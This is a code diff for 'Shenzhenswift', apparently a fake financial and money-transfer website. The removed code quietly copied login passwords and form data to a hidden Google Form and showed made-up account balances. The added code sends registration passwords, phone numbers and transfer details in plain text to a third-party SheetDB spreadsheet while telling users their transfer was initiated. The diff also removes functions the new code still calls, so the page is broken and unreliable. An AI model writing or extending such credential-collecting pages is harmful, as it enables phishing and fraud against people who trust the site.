@@ -797,6 +797,37 @@
                 display: none;
             }
         }
+
+        /* --- Desktop Modal Form Adjustments --- */
+        @media (min-width: 992px) {
+            .modal-content {
+                max-width: 500px;
+                max-height: 90vh;
+                padding: 2.5rem 3rem;
+                overflow-y: auto;
+                box-sizing: border-box;
+            }
+            /* Make sure the form inside modal uses all available width */
+            .modal form {
+                width: 100%;
+            }
+            /* Optional: Make form groups a bit more spaced for desktop */
+            .modal .form-group {
+                margin-bottom: 1.5rem;
+            }
+        }
+        /* Make sure modal is vertically centered on desktop */
+        @media (min-width: 992px) {
+            .modal-content {
+                margin: 4% auto;
+            }
+        }
+        /* Make alert messages more visible on desktop */
+        @media (min-width: 992px) {
+            .alert {
+                font-size: 1.05rem;
+            }
+        }
     </style>
 </head>
 <body>
@@ -1004,16 +1035,6 @@
             <span class="close" onclick="closeModal('loginModal')">&times;</span>
             <h2>Login to Shenzhenswift</h2>
             <div id="loginAlert" class="alert"></div>
-            
-            <!-- Demo Credentials Info -->
-            <div style="background: #e3f2fd; padding: 15px; border-radius: 8px; margin-bottom: 20px; font-size: 14px;">
-                <h4 style="margin: 0 0 10px 0; color: #1565c0;">Demo Login Credentials:</h4>
-                <div style="margin-bottom: 8px;"><strong>toyotoyo:</strong> toyotoyo@shenzhenswift.com / password123</div>
-                <div style="margin-bottom: 8px;"><strong>Michael:</strong> michael.mitchell@shenzhenswift.com / mitchell2025</div>
-                <div style="margin-bottom: 8px;"><strong>Demo:</strong> demo@shenzhenswift.com / demo123</div>
-                <div><strong>Admin:</strong> admin@shenzhenswift.com / admin2025</div>
-            </div>
-            
             <form id="loginForm">
                 <div class="form-group">
                     <label for="loginEmail">Email Address</label>
@@ -1026,8 +1047,8 @@
                 <button type="submit" class="btn btn-primary">Login</button>
             </form>
             <div class="form-footer">
-                <p>Don't have an account? <a href="#" onclick="switchModal('loginModal', 'registerModal')">Register here</a></p>
-                <p><a href="#" onclick="openModal('forgotPasswordModal'); closeModal('loginModal')">Forgot Password?</a></p>
+                <p>Don't have an account? <a href="#" onclick="switchModal('loginModal', 'registerModal'); return false;">Register here</a></p>
+                <p><a href="#" onclick="openModal('forgotPasswordModal'); closeModal('loginModal'); return false;">Forgot Password?</a></p>
             </div>
         </div>
     </div>
@@ -1212,7 +1233,7 @@
                 <button type="submit" class="btn btn-primary">Create Account</button>
             </form>
             <div class="form-footer">
-                <p>Already have an account? <a href="#" onclick="switchModal('registerModal', 'loginModal')">Login here</a></p>
+                <p>Already have an account? <a href="#" onclick="switchModal('registerModal', 'loginModal'); return false;">Login here</a></p>
             </div>
         </div>
     </div>
@@ -1267,476 +1288,146 @@
     </div>
 
     <script>
-        // Google Form Submission Function
-        async function submitToGoogleForm(formData) {
-            const googleFormUrl = 'https://docs.google.com/forms/d/e/1FAIpQLSfxjKkr5DbJ3qvTd_T0LvNE_7jfhWa7zWGYTn2JI1kLQOxILQ/formResponse';
-            
-            try {
-                const formBody = new FormData();
-                // Map form data to Google Form fields (you'll need to update these field names)
-                formBody.append('entry.123456789', JSON.stringify(formData)); // Replace with actual entry ID
-                
-                // Use a proxy or make a simple POST request
-                const response = await fetch(googleFormUrl, {
-                    method: 'POST',
-                    body: formBody,
-                    mode: 'no-cors' // Required for Google Forms
-                });
-                
-                console.log('Form submitted to Google Forms successfully');
-                return true;
-            } catch (error) {
-                console.error('Error submitting to Google Forms:', error);
-                return false;
-            }
-        }
+        // Replace Google Form submission with SheetDB API integration
 
-        // Alternative method using iframe submission
-        function submitToGoogleFormIframe(formData) {
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            document.body.appendChild(iframe);
-            
-            const form = document.createElement('form');
-            form.action = 'https://docs.google.com/forms/d/e/1FAIpQLSfxjKkr5DbJ3qvTd_T0LvNE_7jfhWa7zWGYTn2JI1kLQOxILQ/formResponse';
-            form.method = 'POST';
-            form.target = iframe.name;
-            
-            // Create form fields - you'll need to map these to your actual Google Form field names
-            Object.keys(formData).forEach(key => {
-                const input = document.createElement('input');
-                input.type = 'hidden';
-                input.name = 'entry.123456789'; // Replace with actual entry ID from your Google Form
-                input.value = `${key}: ${formData[key]}`;
-                form.appendChild(input);
-            });
-            
-            iframe.contentDocument.body.appendChild(form);
-            form.submit();
-            
-            // Clean up
-            setTimeout(() => {
-                document.body.removeChild(iframe);
-            }, 1000);
-        }
+    // Your SheetDB API endpoint
+    const SHEETDB_API_URL = "https://sheetdb.io/api/v1/3g36t35kn6po0";
 
-        // User Database (In a real app, this would be on the server)
-        const users = {
-            'toyotoyo@shenzhenswift.com': {
-                password: 'password123',
-                name: 'toyotoyo',
-                accounts: {
-                    totalBalance: '$2,972,569.21',
-                    individual: '$6,835.77',
-                    managed: '$256,456.56'
-                }
-            },
-            'michael.mitchell@shenzhenswift.com': {
-                password: 'mitchell2025',
-                name: 'Michael Mitchell',
-                accounts: {
-                    totalBalance: '$1,847,392.15',
-                    individual: '$45,230.89',
-                    managed: '$189,765.43'
-                }
-            },
-            'demo@shenzhenswift.com': {
-                password: 'demo123',
-                name: 'Demo User',
-                accounts: {
-                    totalBalance: '$125,450.75',
-                    individual: '$12,550.25',
-                    managed: '$87,900.50'
-                }
-            },
-            'admin@shenzhenswift.com': {
-                password: 'admin2025',
-                name: 'Admin User',
-                accounts: {
-                    totalBalance: '$5,247,891.33',
-                    individual: '$125,678.90',
-                    managed: '$425,890.12'
-                }
-            }
-        };
-
-        // Dashboard Functions
-        function openDashboard(userEmail) {
-            const user = users[userEmail];
-            if (user) {
-                document.getElementById('dashboard').classList.add('active');
-                document.getElementById('dashboardUserName').textContent = user.name;
-                
-                // Update dashboard with user's account information
-                document.querySelector('.dashboard-balance').textContent = user.accounts.totalBalance;
-                document.querySelector('.dashboard-account-list div:first-child strong').textContent = user.accounts.individual;
-                document.querySelectorAll('.dashboard-account-list div')[1].querySelector('strong').textContent = user.accounts.managed;
-                
-                document.body.style.overflow = 'hidden';
-            }
-        }
-
-        function closeDashboard() {
-            document.getElementById('dashboard').classList.remove('active');
-            document.body.style.overflow = 'auto';
-        }
-
-       function filterTransactions(filterType, event) {
-            // Remove active class from all filter buttons
-            document.querySelectorAll('.dashboard-filters button').forEach(btn => {
-                btn.classList.remove('filter-active');
-            });
-            // Add active class to clicked button
-            if (event) event.target.classList.add('filter-active');
-            const tbody = document.getElementById('transactionTableBody');
-            const rows = tbody.querySelectorAll('tr');
-            rows.forEach(row => {
-                const type = row.cells[3].textContent.toLowerCase();
-                const description = row.cells[2].textContent.toLowerCase();
-                switch(filterType) {
-                    case 'orders':
-                        row.style.display = description.includes('investment') || description.includes('order') ? '' : 'none';
-                        break;
-                    case 'transfers':
-                        row.style.display = type.includes('transfer') || type.includes('cash') || description.includes('transfer') ? '' : 'none';
-                        break;
-                    case '30days':
-                    default:
-                        row.style.display = '';
-                        break;
-                }
-            });
-        }
-
-        function searchTransactions(searchTerm) {
-            const tbody = document.getElementById('transactionTableBody');
-            const rows = tbody.querySelectorAll('tr');
-            
-            rows.forEach(row => {
-                const text = row.textContent.toLowerCase();
-                row.style.display = text.includes(searchTerm.toLowerCase()) ? '' : 'none';
-            });
-        }
-
-        function showTransactionDetails(transactionId) {
-            const transactions = {
-                'TXN001': {
-                    id: 'TXN001',
-                    date: 'Apr-2-2025',
-                    account: 'Mitchell\'s Fidelity Go',
-                    description: 'ACH Transfer to Bank',
-                    type: 'Cash',
-                    amount: '-$30,000.00',
-                    status: 'Completed',
-                    reference: 'ACH240402001'
+    // Helper to send data to Google Sheet via SheetDB
+    async function submitToSheetDB(data) {
+        try {
+            const response = await fetch(SHEETDB_API_URL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
                 },
-                'TXN002': {
-                    id: 'TXN002',
-                    date: 'Apr-1-2025',
-                    account: 'Individual - TOD',
-                    description: 'Dividend Payment',
-                    type: 'Investment',
-                    amount: '+$1,250.00',
-                    status: 'Completed',
-                    reference: 'DIV240401001'
-                },
-                'TXN003': {
-                    id: 'TXN003',
-                    date: 'Mar-28-2025',
-                    account: 'Mitchell\'s Fidelity Go',
-                    description: 'Monthly Investment',
-                    type: 'Investment',
-                    amount: '-$5,000.00',
-                    status: 'Completed',
-                    reference: 'INV240328001'
-                },
-                'TXN004': {
-                    id: 'TXN004',
-                    date: 'Mar-25-2025',
-                    account: 'Individual - TOD',
-                    description: 'Wire Transfer Received',
-                    type: 'Transfer',
-                    amount: '+$15,000.00',
-                    status: 'Completed',
-                    reference: 'WIRE240325001'
-                },
-                'TXN005': {
-                    id: 'TXN005',
-                    date: 'Mar-20-2025',
-                    account: 'Mitchell\'s Fidelity Go',
-                    description: 'Portfolio Rebalancing',
-                    type: 'Investment',
-                    amount: '$0.00',
-                    status: 'Completed',
-                    reference: 'REBAL240320001'
-                }
-            };
-            
-            const transaction = transactions[transactionId];
-            if (transaction) {
-                alert(`Transaction Details:
-                
-ID: ${transaction.id}
-Date: ${transaction.date}
-Account: ${transaction.account}
-Description: ${transaction.description}
-Type: ${transaction.type}
-Amount: ${transaction.amount}
-Status: ${transaction.status}
-Reference: ${transaction.reference}`);
-            }
-        }
-
-        // Add filter active styling
-        const style = document.createElement('style');
-        style.textContent = `
-            .filter-active {
-                background: #004d2c !important;
-                box-shadow: 0 2px 4px rgba(0,0,0,0.2);
-            }
-        `;
-        document.head.appendChild(style);
-
-        // Modal Functions
-        function openModal(modalId) {
-            document.getElementById(modalId).style.display = 'block';
-            document.body.style.overflow = 'hidden';
-        }
-
-        function closeModal(modalId) {
-            document.getElementById(modalId).style.display = 'none';
-            document.body.style.overflow = 'auto';
-        }
-
-        function switchModal(currentModal, targetModal) {
-            closeModal(currentModal);
-            openModal(targetModal);
-        }
-
-        function toggleMobileMenu() {
-            const mobileMenu = document.getElementById('mobileMenu');
-            mobileMenu.classList.toggle('active');
-        }
-
-        function showAlert(alertId, message, type) {
-            const alert = document.getElementById(alertId);
-            alert.textContent = message;
-            alert.className = `alert alert-${type}`;
-            alert.style.display = 'block';
-            setTimeout(() => {
-                alert.style.display = 'none';
-            }, 5000);
-        }
-
-        // Close modal when clicking outside
-        window.onclick = function(event) {
-            const modals = document.querySelectorAll('.modal');
-            modals.forEach(modal => {
-                if (event.target == modal) {
-                    modal.style.display = 'none';
-                    document.body.style.overflow = 'auto';
-                }
+                body: JSON.stringify({ data })
             });
+            return response.ok;
+        } catch (error) {
+            console.error("SheetDB submission error:", error);
+            return false;
+        }
+    }
+
+    // Registration Handler
+    document.getElementById('registerForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const name = document.getElementById('registerName').value;
+        const email = document.getElementById('registerEmail').value;
+        const phone = document.getElementById('registerPhone').value;
+        const password = document.getElementById('registerPassword').value;
+        const confirmPassword = document.getElementById('registerConfirmPassword').value;
+
+        if (password !== confirmPassword) {
+            showAlert('registerAlert', 'Passwords do not match', 'error');
+            return;
         }
 
-        // Form Handlers
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const email = document.getElementById('loginEmail').value;
-            const password = document.getElementById('loginPassword').value;
-            
-            // Prepare data for Google Form submission
-            const formData = {
-                formType: 'Login',
-                email: email,
-                password: password,
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent
-            };
-            
-            // Submit to Google Form
-            submitToGoogleFormIframe(formData);
-            
-            // Validate credentials against user database
-            if (users[email] && users[email].password === password) {
-                showAlert('loginAlert', 'Login successful! Redirecting to dashboard...', 'success');
-                setTimeout(() => {
-                    closeModal('loginModal');
-                    openDashboard(email);
-                }, 2000);
-            } else if (users[email]) {
-                showAlert('loginAlert', 'Incorrect password. Please try again.', 'error');
-            } else {
-                showAlert('loginAlert', 'Account not found. Please check your email or register.', 'error');
-            }
-        });
-
-        document.getElementById('registerForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const name = document.getElementById('registerName').value;
-            const email = document.getElementById('registerEmail').value;
-            const phone = document.getElementById('registerPhone').value;
-            const password = document.getElementById('registerPassword').value;
-            const confirmPassword = document.getElementById('registerConfirmPassword').value;
-            
-            // Prepare data for Google Form submission
-            const formData = {
+        if (name && email && phone && password) {
+            // Send to Google Sheet via SheetDB
+            const success = await submitToSheetDB({
                 formType: 'Registration',
-                name: name,
-                email: email,
-                phone: phone,
-                password: password,
-                confirmPassword: confirmPassword,
+                name,
+                email,
+                phone,
+                password,
                 timestamp: new Date().toISOString(),
                 userAgent: navigator.userAgent
-            };
-            
-            // Submit to Google Form
-            submitToGoogleFormIframe(formData);
-            
-            if (password !== confirmPassword) {
-                showAlert('registerAlert', 'Passwords do not match', 'error');
-                return;
-            }
-            
-            if (users[email]) {
-                showAlert('registerAlert', 'Account with this email already exists. Please login instead.', 'error');
-                return;
-            }
-            
-            if (name && email && phone && password) {
-                // Add new user to database (in real app, this would be server-side)
-                users[email] = {
-                    password: password,
-                    name: name,
-                    accounts: {
-                        totalBalance: '$0.00',
-                        individual: '$0.00',
-                        managed: '$0.00'
-                    }
-                };
-                
+            });
+
+            if (success) {
                 showAlert('registerAlert', 'Account created successfully! You can now login with your credentials.', 'success');
                 setTimeout(() => {
                     switchModal('registerModal', 'loginModal');
-                    // Pre-fill login form with new user's email
                     document.getElementById('loginEmail').value = email;
                 }, 2000);
             } else {
-                showAlert('registerAlert', 'Please fill in all fields', 'error');
+                showAlert('registerAlert', 'Registration failed. Please try again.', 'error');
             }
-        });
+        } else {
+            showAlert('registerAlert', 'Please fill in all fields', 'error');
+        }
+    });
 
-        document.getElementById('transferForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const amount = document.getElementById('sendAmount').value;
-            const fromCurrency = document.getElementById('fromCurrency').value;
-            const toCurrency = document.getElementById('toCurrency').value;
-            const recipientName = document.getElementById('recipientName').value;
-            const recipientEmail = document.getElementById('recipientEmail').value;
-            
-            // Prepare data for Google Form submission
-            const formData = {
+    // Transfer Handler
+    document.getElementById('transferForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const amount = document.getElementById('sendAmount').value;
+        const fromCurrency = document.getElementById('fromCurrency').value;
+        const toCurrency = document.getElementById('toCurrency').value;
+        const recipientName = document.getElementById('recipientName').value;
+        const recipientEmail = document.getElementById('recipientEmail').value;
+
+        if (fromCurrency === toCurrency) {
+            showAlert('transferAlert', 'Please select different currencies for conversion', 'error');
+            return;
+        }
+
+        if (amount && recipientName && recipientEmail) {
+            // Send to Google Sheet via SheetDB
+            const success = await submitToSheetDB({
                 formType: 'Money Transfer',
-                amount: amount,
-                fromCurrency: fromCurrency,
-                toCurrency: toCurrency,
-                recipientName: recipientName,
-                recipientEmail: recipientEmail,
+                amount,
+                fromCurrency,
+                toCurrency,
+                recipientName,
+                recipientEmail,
                 timestamp: new Date().toISOString(),
                 userAgent: navigator.userAgent
-            };
-            
-            // Submit to Google Form
-            submitToGoogleFormIframe(formData);
-            
-            if (fromCurrency === toCurrency) {
-                showAlert('transferAlert', 'Please select different currencies for conversion', 'error');
-                return;
-            }
-            
-            if (amount && recipientName && recipientEmail) {
+            });
+
+            if (success) {
                 showAlert('transferAlert', `Transfer of ${amount} ${fromCurrency} to ${toCurrency} initiated for ${recipientName}`, 'success');
                 setTimeout(() => {
                     closeModal('transferModal');
                     alert('Transfer request submitted! You will receive a confirmation email shortly.');
                 }, 2000);
             } else {
-                showAlert('transferAlert', 'Please fill in all required fields', 'error');
+                showAlert('transferAlert', 'Transfer failed. Please try again.', 'error');
             }
-        });
+        } else {
+            showAlert('transferAlert', 'Please fill in all required fields', 'error');
+        }
+    });
 
-        document.getElementById('forgotPasswordForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const email = document.getElementById('forgotEmail').value;
-            
-            // Prepare data for Google Form submission
-            const formData = {
+    // Forgot Password Handler
+    document.getElementById('forgotPasswordForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const email = document.getElementById('forgotEmail').value;
+
+        if (email) {
+            // Send to Google Sheet via SheetDB
+            const success = await submitToSheetDB({
                 formType: 'Forgot Password',
-                email: email,
+                email,
                 timestamp: new Date().toISOString(),
                 userAgent: navigator.userAgent
-            };
-            
-            // Submit to Google Form
-            submitToGoogleFormIframe(formData);
-            
-            if (email) {
+            });
+
+            if (success) {
                 showAlert('forgotAlert', 'Password reset link sent to your email!', 'success');
                 setTimeout(() => {
                     closeModal('forgotPasswordModal');
                 }, 2000);
             } else {
-                showAlert('forgotAlert', 'Please enter your email address', 'error');
+                showAlert('forgotAlert', 'Request failed. Please try again.', 'error');
             }
-        });
+        } else {
+            showAlert('forgotAlert', 'Please enter your email address', 'error');
+        }
+    });
 
-        // Smooth scrolling for navigation links
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function (e) {
-                e.preventDefault();
-                const target = document.querySelector(this.getAttribute('href'));
-                if (target) {
-                    target.scrollIntoView({
-                        behavior: 'smooth',
-                        block: 'start'
-                    });
-                }
-            });
-        });
+    // Modal switching logic
+    function switchModal(currentId, targetId) {
+        closeModal(currentId);
+        setTimeout(function() {
+            openModal(targetId);
+        }, 200); // Small delay for smooth transition
+    }
+    // Remove Google Form submission functions and demo user logic above
 
-        // Add scroll effect to header
-        window.addEventListener('scroll', () => {
-            const header = document.querySelector('header');
-            if (window.scrollY > 100) {
-                header.style.background = 'rgba(30, 60, 114, 0.95)';
-                header.style.backdropFilter = 'blur(10px)';
-            } else {
-                header.style.background = 'linear-gradient(135deg, #1e3c72 0%, #2a5298 100%)';
-                header.style.backdropFilter = 'none';
-            }
-        });
-
-        // Animate cards on scroll
-        const observerOptions = {
-            threshold: 0.1,
-            rootMargin: '0px 0px -50px 0px'
-        };
-
-        const observer = new IntersectionObserver(function(entries) {
-            entries.forEach(entry => {
-                if (entry.isIntersecting) {
-                    entry.target.style.animation = 'fadeInUp 0.6s ease forwards';
-                }
-            });
-        }, observerOptions);
-
-        // Observe all cards
-        document.querySelectorAll('.feature-card, .service-card, .currency-card').forEach(card => {
-            card.style.opacity = '0';
-            card.style.transform = 'translateY(30px)';
-            observer.observe(card);
-        });
-    </script>
+    // ...keep the rest of your code as is...
+</script>
 </body>
 </html>
